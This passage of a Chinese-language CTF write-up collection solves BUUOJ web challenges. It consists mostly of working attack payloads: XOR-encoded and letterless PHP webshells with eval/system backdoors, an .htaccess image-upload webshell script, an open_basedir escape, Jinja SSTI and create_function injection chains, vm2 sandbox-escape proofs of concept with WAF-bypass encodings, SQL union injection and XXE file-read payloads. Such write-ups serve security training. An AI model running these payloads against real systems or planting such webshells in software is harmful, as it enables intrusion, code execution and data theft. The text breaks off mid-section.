31 32 33 34 35 36 37 38 \u0026lt;?php function get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = \u0026#34;upload/tmp_\u0026#34;.md5($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[\u0026#34;file\u0026#34;])){ $tmp_name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;]; $name = $_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]; $extension = substr($name, strrpos($name,\u0026#34;.\u0026#34;)+1); if(preg_match(\u0026#34;/ph/i\u0026#34;,$extension)) die(\u0026#34;^_^\u0026#34;); if(mb_strpos(file_get_contents($tmp_name), \u0026#39;\u0026lt;?\u0026#39;)!==False) die(\u0026#34;^_^\u0026#34;); if(!exif_imagetype($tmp_name)) die(\u0026#34;^_^\u0026#34;); $path= $userdir.\u0026#34;/\u0026#34;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); } } $hhh = @$_GET[\u0026#39;_\u0026#39;]; if (!$hhh){ highlight_file(__FILE__); } if(strlen($hhh)\u0026gt;18){ die(\u0026#39;One inch long, one inch strong!\u0026#39;); } if ( preg_match(\u0026#39;/[\\x00- 0-9A-Za-z\\\u0026#39;\u0026#34;\\`~_\u0026amp;.,|=[\\x7F]+/i\u0026#39;, $hhh) ) die(\u0026#39;Try something else!\u0026#39;); $character_type = count_chars($hhh, 3); if(strlen($character_type)\u0026gt;12) die(\u0026#34;Almost there!\u0026#34;); eval($hhh); ?\u0026gt; 过滤了取反符号，只能异或来绕过写webshell\n异或脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php function finds($string){ $index = 0; $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255]; for($i=27;$i\u0026lt;count($a);$i++){ for($j=27;$j\u0026lt;count($a);$j++){ $x = $a[$i] ^ $a[$j]; for($k = 0;$k\u0026lt;strlen($string);$k++){ if(ord($string[$k]) == $x){ echo $string[$k].\u0026#34;\\n\u0026#34;; echo \u0026#39;%\u0026#39; . dechex($a[$i]) . \u0026#39;^%\u0026#39; . dechex($a[$j]).\u0026#34;\\n\u0026#34;; $index++; if($index == strlen($string)){ return 0; } } } } } } finds(\u0026#34;_GET\u0026#34;); ?\u0026gt; 1 2 ?.=${%80%80%80%80^%DF%C7%C5%D4}{%81}();\u0026amp;%81=phpinfo //这里.和_一样的 非预期是直接搜flag就出来了\n预期解利用get_the_flag函数\n文件上传部分过滤了拓展名ph，而且把\u0026lt;?过滤了，但是php7不能用script标签绕过了\nexif_imagetype不能简单用GIF89a绕过了，这里可以在.htaccess添加文件头\n1 2 #define width 1 #define height 1 1 2 3 或者在.htaccess前添加x00x00x8ax39x8ax39(要在十六进制编辑器中添加，或者使用python的bytes类型) x00x00x8ax39x8ax39 是wbmp文件的文件头 .htaccess中以0x00开头的同样也是注释符，所以不会影响.htaccess 利用php_value auto_append_file指定文件包含，然后就可以利用base64来进行绕过\u0026lt;?标签限制\n1 2 3 4 #define width 1 #define height 1 AddType application/x-httpd-php .jpg php_value auto_append_file \u0026#34;php://filter/convert.base64-decode/resource=./1.jpg\u0026#34; 然后在1.jpg里面写入base64的马\n1 2 GIF89abb PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4 这里因为base64解密是4位一解码，我们补上两个b凑四位\n利用脚本上传\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import requests import base64 htaccess = b\u0026#34;\u0026#34;\u0026#34; #define width 1337 #define height 1337 AddType application/x-httpd-php .jpg php_value auto_append_file \u0026#34;php://filter/convert.base64-decode/resource=./shell.jpg\u0026#34; \u0026#34;\u0026#34;\u0026#34; shell = b\u0026#34;GIF89abbPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4\u0026#34; url = \u0026#34;http://0e57dfd9-bd66-4101-8c76-8baa918b86bb.node5.buuoj.cn:81/?_=${%86%86%86%86^%d9%c1%c3%d2}{%86}();\u0026amp;%86=get_the_flag\u0026#34; files = {\u0026#39;file\u0026#39;:(\u0026#39;.htaccess\u0026#39;,htaccess,\u0026#39;image/jpeg\u0026#39;)} data = {\u0026#34;upload\u0026#34;:\u0026#34;Submit\u0026#34;} response = requests.post(url=url, data=data, files=files) print(response.text) files = {\u0026#39;file\u0026#39;:(\u0026#39;shell.jpg\u0026#39;,shell,\u0026#39;image/jpeg\u0026#39;)} response = requests.post(url=url, data=data, files=files) print(response.text) 出来路径\n1 2 upload/tmp_fc3f8d0d99ccdde85c8cfc624fe94c32/.htaccess upload/tmp_fc3f8d0d99ccdde85c8cfc624fe94c32/shell.jpg 蚁剑连接插件绕过\n或者写文件来读根目录下文件\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php mkdir(\u0026#39;img\u0026#39;); chdir(\u0026#39;img\u0026#39;); ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); chdir(\u0026#39;..\u0026#39;); ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/\u0026#39;); var_dump(scandir(\u0026#39;/\u0026#39;)); ?\u0026gt; 读到之后\n1 echo file_get_contents(\u0026#34;/THis_Is_tHe_F14g\u0026#34;); [CISCN2019 华东南赛区]Double Secret 目录扫描扫出/console\n得算pin码了，但是信息不够\n回到原来界面，访问/secret路由\n传参secret，出现报错\nrc4加密\n1 2 3 4 5 6 7 8 9 10 if(secret==None): return \u0026#39;Tell me your secret.I will encrypt it so others can\\\u0026#39;t see\u0026#39; rc=rc4_Modified.RC4(\u0026#34;HereIsTreasure\u0026#34;) #解密 deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if \u0026#39;ciscn\u0026#39; in a.lower(): return \u0026#39;flag detected!\u0026#39; return a 打ssti然后用rc4加密，用cyberchef加密\n或者上脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import base64 from urllib.parse import quote def rc4_main(key = \u0026#34;init_key\u0026#34;, message = \u0026#34;init_message\u0026#34;): # print(\u0026#34;RC4加密主函数\u0026#34;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return crypt def rc4_init_sbox(key): s_box = list(range(256)) # print(\u0026#34;原来的 s 盒：%s\u0026#34; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(\u0026#34;混乱后的 s 盒：%s\u0026#34;% s_box) return s_box def rc4_excrypt(plain, box): # print(\u0026#34;调用加密程序成功。\u0026#34;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = \u0026#34;\u0026#34;.join(res) print(\u0026#34;%s\u0026#34; %quote(cipher)) return (str(base64.b64encode(cipher.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;)) rc4_main(\u0026#34;HereIsTreasure\u0026#34;,\u0026#34;{{lipsum.__globals__.__builtins__.eval(\\\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /flag.txt\u0026#39;).read()\\\u0026#34;)}}\u0026#34;) 1 2 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}} {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat /flag.txt\u0026#34;).read()\u0026#39;)}} [GKCTF 2021]easycms 目录扫描admin.php\n弱口令admin/12345登入\n在设计这里自定义可以编辑php代码\n/var/www/html/system/tmp/tgom.txt\n新建一个文件,上传后编辑\n文件名为../../../../../system/tmp/tgom\n然后回去编辑就行了，回到主页就能看到flag\n另一种做法，导出主题\n会提示下载，复制下载连接\n1 http://18f6826c-975b-4018-8d7c-014a078b56b0.node5.buuoj.cn:81/admin.php?m=ui\u0026amp;f=downloadtheme\u0026amp;theme=L3Zhci93d3cvaHRtbC9zeXN0ZW0vdG1wL3RoZW1lL2RlZmF1bHQvMS56aXA= 把后面这串base64解码\n1 /var/www/html/system/tmp/theme/default/1.zip 我们改为/flag就行了\n然后下载得到flag\n[BJDCTF2020]EzPHP 看源码有base32编码，解码得1nD3x.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 \u0026lt;?php highlight_file(__FILE__); error_reporting(0); $file = \u0026#34;1nD3x.php\u0026#34;; $shana = $_GET[\u0026#39;shana\u0026#39;]; $passwd = $_GET[\u0026#39;passwd\u0026#39;]; $arg = \u0026#39;\u0026#39;; $code = \u0026#39;\u0026#39;; echo \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;font color=red\u0026gt;\u0026lt;B\u0026gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!\u0026lt;/B\u0026gt;\u0026lt;br\u0026gt;\u0026lt;/font\u0026gt;\u0026#34;; if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) die(\u0026#39;You seem to want to do something bad?\u0026#39;); } if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) { $file = $_GET[\u0026#34;file\u0026#34;]; echo \u0026#34;Neeeeee! Good Job!\u0026lt;br\u0026gt;\u0026#34;; } } else die(\u0026#39;fxck you! What do you want to do ?!\u0026#39;); if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) die(\u0026#39;fxck you! I hate English!\u0026#39;); } } if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) die(\u0026#34;Aqua is the cutest five-year-old child in the world! Isn\u0026#39;t it ?\u0026lt;br\u0026gt;\u0026#34;); if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ){ extract($_GET[\u0026#34;flag\u0026#34;]); echo \u0026#34;Very good! you know my password. But what is flag?\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#34;fxck you! you don\u0026#39;t know my password! And you don\u0026#39;t know sha1! why you come here!\u0026#34;); } if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) { die(\u0026#34;\u0026lt;br /\u0026gt;Neeeeee~! I have disabled all dangerous functions! You can\u0026#39;t get my flag =w=\u0026#34;); } else { include \u0026#34;flag.php\u0026#34;; $code(\u0026#39;\u0026#39;, $arg); } ?\u0026gt; 第一层\n1 2 3 4 if($_SERVER) { if ( preg_match(\u0026#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\\.|\\\u0026#34;|\\\u0026#39;|log/i\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) ) 这一层用url编码绕过\n1 ?%73hana=1 第二层\n1 2 if (!preg_match(\u0026#39;/http|https/i\u0026#39;, $_GET[\u0026#39;file\u0026#39;])) { if (preg_match(\u0026#39;/^aqua_is_cute$/\u0026#39;, $_GET[\u0026#39;debu\u0026#39;]) \u0026amp;\u0026amp; $_GET[\u0026#39;debu\u0026#39;] !== \u0026#39;aqua_is_cute\u0026#39;) 在传入参数最后加入换行符就能绕过%0a\n1 ?%64ebu=%61qua_is_%63ute%0a 第三层\n1 2 3 if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match(\u0026#39;/[a-zA-Z]/i\u0026#39;, $value)) $_REQUEST在同时接收GET和POST参数时，POST优先级更高\n所以只需要POST相同的参数即可绕过。\n第四层\n1 if (file_get_contents($file) !== \u0026#39;debu_debu_aqua\u0026#39;) 用data伪协议或者php://input写入\n第五层\n1 if ( sha1($shana) === sha1($passwd) \u0026amp;\u0026amp; $shana != $passwd ) 数组绕过\n1 ?shana[]=1\u0026amp;passwd[]=2 第六层\n1 2 if(preg_match(\u0026#39;/^[a-z0-9]*$/isD\u0026#39;, $code) || preg_match(\u0026#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\\u0026amp;|\\$|\\*|\\||\\\u0026lt;|\\\u0026#34;|\\\u0026#39;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i\u0026#39;, $arg) ) $code和$arg可控，利用$code('',$arg)进行create_function注入\n1 2 3 4 5 6 7 8 9 在上一阶段的extract($_GET[\u0026#34;flag\u0026#34;]);处进行变量覆盖，从而使变量$code和变量$arg可控 首先闭合原有的语句： flag[arg]=} 很多函数被禁用，先使用get_defined_vars()将所有变量与值都进行输出 flag[code]=create_function\u0026amp;flag[arg]=}var_dump(get_defined_vars());// // 等价于 function{ } var_dump(get_defined_vars());//} 得到rea1fl4g.php\n利用require()，来代替include()：\n1 flag[code]=create_function\u0026amp;flag[arg]=}require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());// 得到假flag\nurl取反绕过\n1 2 3 echo urlencode(~\u0026#39;php://filter/read=convert.base64-encode/resource=rea1fl4g.php\u0026#39;); 用require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)) 替换刚才的var_dump(get_defined_vars())被编码的部分即可。 最终payload\n1 2 3 4 5 6 7 // GET ?debu=aqua_is_cute%0a\u0026amp;file=data://text/plain,debu_debu_aqua\u0026amp;shana[]=1\u0026amp;passwd[]=2\u0026amp;flag[arg]=};require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);var_dump(get_defined_vars());//\u0026amp;flag[code]=create_function ?%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0A\u0026amp;file=data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61\u0026amp;%73%68%61%6e%61[]=1\u0026amp;%70%61%73%73%77%64[]=2\u0026amp;%66%6c%61%67[%61%72%67]=;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//\u0026amp;%66%6c%61%67[%63%6f%64%65]=create_function // POST debu=1\u0026amp;file=1 [GYCTF2020]EasyThinking 利用thinkphp6.0往session进行任意文件写入的漏洞\n构造PHPSESSID的值，改值长度为32且为string型，然后就会在/runtime/session/目录下产生一个php文件\n然后访问\n1 /runtime/session/sess_1111111111111111111111111111.php 蚁剑连接，插件绕过\n[GXYCTF2019]StrongestMind 爬虫\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import requests import re import time url = \u0026#39;http://8131dc42-f253-4d5f-b190-58956c615ca6.node5.buuoj.cn:81/\u0026#39; session = requests.session() req = session.get(url).text flag = \u0026#34;\u0026#34; for i in range(1010): try: result = re.findall(\u0026#34;\\\u0026lt;br\\\u0026gt;\\\u0026lt;br\\\u0026gt;(\\d.*?)\\\u0026lt;br\\\u0026gt;\\\u0026lt;br\\\u0026gt;\u0026#34;,req)#获取[数字] result = \u0026#34;\u0026#34;.join(result)#提取字符串 result = eval(result)#运算 print(\u0026#34;time: \u0026#34;+ str(i) +\u0026#34; \u0026#34;+\u0026#34;result: \u0026#34;+ str(result)) data = {\u0026#34;answer\u0026#34;:result} req = session.post(url,data=data).text if \u0026#34;flag{\u0026#34; in req: print(re.search(\u0026#34;flag{.*}\u0026#34;, req).group(0)[:50]) break time.sleep(0.1)#防止访问太快断开连接 except: print(\u0026#34;[-]\u0026#34;) [HFCTF2020]JustEscape 打开界面有run.php\n下面又说真的是php吗\n1 2 3 4 5 6 7 8 \u0026lt;?php if( array_key_exists( \u0026#34;code\u0026#34;, $_GET ) \u0026amp;\u0026amp; $_GET[ \u0026#39;code\u0026#39; ] != NULL ) { $code = $_GET[\u0026#39;code\u0026#39;]; echo eval(code); } else { highlight_file(__FILE__); } ?\u0026gt; 考虑到eval函数不止php有，nodejs也有\n用Error().stack看报错信息\n代码篇 - Error Stack - 《Node.js 调试指南》 - 书栈网 · BookStack\n1 run.php?code=Error().stack 1 2 3 4 5 6 7 8 9 10 11 Error at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) vm沙箱逃逸\n用github有现成的poc\nBreakout in v3.8.3 · Issue #225 · patriksimek/vm2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 One can break out of the sandbox via: \u0026#34;use strict\u0026#34;; const {VM} = require(\u0026#39;vm2\u0026#39;); const untrusted = \u0026#39;(\u0026#39; + function(){ TypeError.prototype.get_process = f=\u0026gt;f.constructor(\u0026#34;return process\u0026#34;)(); try{ Object.preventExtensions(Buffer.from(\u0026#34;\u0026#34;)).a = 1; }catch(e){ return e.get_process(()=\u0026gt;{}).mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;whoami\u0026#34;).toString(); } }+\u0026#39;)()\u0026#39;; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } And another more game breaking one: \u0026#34;use strict\u0026#34;; const {VM} = require(\u0026#39;vm2\u0026#39;); const untrusted = \u0026#39;(\u0026#39; + function(){ try{ Buffer.from(new Proxy({}, { getOwnPropertyDescriptor(){ throw f=\u0026gt;f.constructor(\u0026#34;return process\u0026#34;)(); } })); }catch(e){ return e(()=\u0026gt;{}).mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;whoami\u0026#34;).toString(); } }+\u0026#39;)()\u0026#39;; try{ console.log(new VM().run(untrusted)); }catch(x){ console.log(x); } 直接用会被waf\n过滤了\n1 [\u0026#39;for\u0026#39;, \u0026#39;while\u0026#39;, \u0026#39;process\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;constructor\u0026#39;, \u0026#39;prototype\u0026#39;, \u0026#39;Function\u0026#39;, \u0026#39;+\u0026#39;, \u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026#39;\u0026#39;] 官方wp是在关键字上用两个反引号绕过,然后url编码一下\n1 2 3 比如prototype变成`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e` f.constructor(\u0026#34;return process\u0026#34;)(); f[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))(); 1 /run.php?code=(()=%3E{%20TypeError[[`p`,`r`,`o`,`t`,`o`,`t`,`y`,`p`,`e`][`join`](``)][`a`]%20=%20f=%3Ef[[`c`,`o`,`n`,`s`,`t`,`r`,`u`,`c`,`t`,`o`,`r`][`join`](``)]([`r`,`e`,`t`,`u`,`r`,`n`,`%20`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))();%20try{%20Object[`preventExtensions`](Buffer[`from`](``))[`a`]%20=%201;%20}catch(e){%20return%20e[`a`](()=%3E{})[`mainModule`][[`r`,`e`,`q`,`u`,`i`,`r`,`e`][`join`](``)]([`c`,`h`,`i`,`l`,`d`,`_`,`p`,`r`,`o`,`c`,`e`,`s`,`s`][`join`](``))[[`e`,`x`,`e`,`c`,`S`,`y`,`n`,`c`][`join`](``)](`cat+%2fflag`)[`toString`]();%20}%20})() 另一种办法是\n1 2 prototype `${`${`prototyp`}e`}` 把关键字全部替换成这种格式\n1 2 3 4 5 6 7 8 (function (){ TypeError[`${`${`prototyp`}e`}`][`${`${`get_proces`}s`}`] = f=\u0026gt;f[`${`${`constructo`}r`}`](`${`${`return this.proces`}s`}`)(); try{ Object.preventExtensions(Buffer.from(``)).a = 1; }catch(e){ return e[`${`${`get_proces`}s`}`](()=\u0026gt;{}).mainModule[`${`${`requir`}e`}`](`${`${`child_proces`}s`}`)[`${`${`exe`}cSync`}`](`whoami`).toString(); } })() [SUCTF 2018]GetShell 无字母数字webshell\n1 2 3 4 5 6 7 8 \u0026lt;?php $_=[]; $__=$_.$_; $_=($_==$__); $__=($_==$_); $___ = ~区[$__].~冈[$__].~区[$__].~勺[$__].~皮[$__].~针[$__]; $____ = ~码[$__].~寸[$__].~小[$__].~欠[$__].~立[$__]; $____($$__[_]); system($_POST[_]) 读环境变量\n[b01lers2020]Life on Mars sql注入\n1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata\u0026amp;{}\u0026amp;_=1745230942307 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=\u0026#39;alien_code\u0026#39; 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=\u0026#39;code\u0026#39; 1 /query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(code)from/**/alien_code.code EasyBypass ez\n1 /?comm1=\u0026#34;;sort+/fla?;\u0026#34;\u0026amp;comm2=1 [极客大挑战 2020]Roamphp1-Welcome post传\n1 roam1[]=1\u0026amp;roam2[]=2 [CSAWQual 2019]Web_Unagi 有waf的xxe,题目给格式\n1 2 3 4 5 6 7 8 9 \u0026lt;users\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt;alice\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;passwd1\u0026lt;/password\u0026gt; \u0026lt;name\u0026gt;Alice\u0026lt;/name\u0026gt; \u0026lt;email\u0026gt;alice@fakesite.com\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;CSAW2019\u0026lt;/group\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/users\u0026gt; 直接全部变成\u0026amp;xxe;\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE users [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt;]\u0026gt; \u0026lt;users\u0026gt; \u0026lt;user\u0026gt; \u0026lt;username\u0026gt;\u0026amp;xxe;\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;\u0026amp;xxe;\u0026lt;/password\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;email\u0026gt;\u0026amp;xxe;\u0026lt;/email\u0026gt; \u0026lt;group\u0026gt;\u0026amp;xxe;\u0026lt;/group\u0026gt; \u0026lt;intro\u0026gt;\u0026amp;xxe;\u0026lt;/intro\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/users\u0026gt; 这里加的intro是能读全部的，但是被waf了，编码绕过\n1 iconv -f utf8 -t utf-16 2.xml\u0026gt;1.xml [MRCTF2020]Ezaudit php_mt_seed爆种子\n先将密钥转换\n1 2 3 4 5 6 7 8 9 10 11 str1=\u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39; str2=\u0026#39;KVQP0LdJKRaV3n9D\u0026#39; str3 = str1[::-1] length = len(str2) res=\u0026#39;\u0026#39; for i in range(len(str2)): for j in range(len(str1)): if str2[i] == str1[j]: res+=str(j)+\u0026#39; \u0026#39;+str(j)+\u0026#39; \u0026#39;+\u0026#39;0\u0026#39;+\u0026#39; \u0026#39;+str(len(str1)-1)+\u0026#39; \u0026#39; break print(res) 1 ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 然后根据题目逻辑算私钥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php mt_srand(1775196155); //公钥 function public_key($length = 16) { $strings1 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $public_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } //私钥 function private_key($length = 12) { $strings2 = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#39;; $private_key = \u0026#39;\u0026#39;; for ( $i = 0; $i \u0026lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } echo public_key(); echo private_key(); ?\u0026gt; 版本要是前下算种子的版本\n然后万能密码登入\n1 2 3 crispr 1\u0026#39; or true# XuNhoueCDCGc [BSidesCF 2019]SVGMagic 利用svg标签来读flag\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE note [ \u0026lt;!ENTITY file SYSTEM \u0026#34;file:///proc/self/cwd/flag.txt\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;svg height=\u0026#34;200\u0026#34; width=\u0026#34;1000\u0026#34;\u0026gt; \u0026lt;text x=\u0026#34;10\u0026#34; y=\u0026#34;20\u0026#34;\u0026gt;\u0026amp;file;\u0026lt;/text\u0026gt; \u0026lt;/svg\u0026gt; /proc/self/cwd表示当前目录下运行的文件\n[ISITDTU 2019]EasyPHP 1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $_ = @$_GET[\u0026#39;_\u0026#39;]; if ( preg_match(\u0026#39;/[\\x00- 0-9\\\u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops\\x7F]+/i\u0026#39;, $_) ) die(\u0026#39;rosé will not do it\u0026#39;); if ( strlen(count_chars(strtolower($_), 0x3)) \u0026gt; 0xd ) die(\u0026#39;you are so close, omg\u0026#39;); eval($_); ?\u0026gt; 1 2 3 \\x00- 0-9 匹配\\x00到空格(\\x20)，0-9的数字 \u0026#39;\u0026#34;`$\u0026amp;.,|[{_defgops 匹配这些字符 \\x7F 匹配DEL(\\x7F)字符 下面这个会统计用过的不同字符，超过13个被waf\n利用字符串异或\n先确定自己想执行的语句，比如phpinfo，然后定一个参考字符串，让phpinfo和它异或，就可以得到想要的输入，如果得到的结果不符合要求，再微调参考字符串\n1 2 3 4 5 6 p:%8f^%ff h:%97^%ff i:%96^%ff n:%91^%ff f:%99^%ff o:%90^%ff 脚本\n1 2 3 4 5 6 7 